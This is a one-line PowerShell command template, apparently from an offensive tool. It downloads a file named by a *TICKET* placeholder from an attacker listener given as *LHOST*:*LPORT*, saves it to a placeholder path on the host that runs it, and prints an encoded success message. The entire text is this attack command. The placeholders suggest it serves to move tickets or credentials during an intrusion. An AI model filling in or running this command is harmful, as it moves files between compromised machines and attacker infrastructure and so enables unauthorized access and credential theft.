try {IRM -Uri "http://*LHOST*:*LPORT*/*TICKET*" -UseBasicParsing -OutFile *DEST*; [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('U3VjY2VzcwUh'))} catch {echo $_}
